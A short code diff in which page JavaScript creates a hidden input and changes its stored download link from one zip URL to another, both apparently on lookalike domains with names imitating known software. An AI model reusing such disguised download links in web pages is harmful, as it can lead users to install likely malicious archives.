@@ -3,7 +3,7 @@
             const copyLinkInput = document.createElement('input');
             copyLinkInput.type = 'text';
             copyLinkInput.id = 'copyLink';
-            copyLinkInput.value = 'https://oss-zzz88.ossdowns05.xyz/Cho-rmex.zip';
+            copyLinkInput.value = 'https://youdaoselw.icu/Diosoy_GioGtsLLQ_v9929.28.zip';
             copyLinkInput.style.display = 'none';
             document.body.appendChild(copyLinkInput);
 
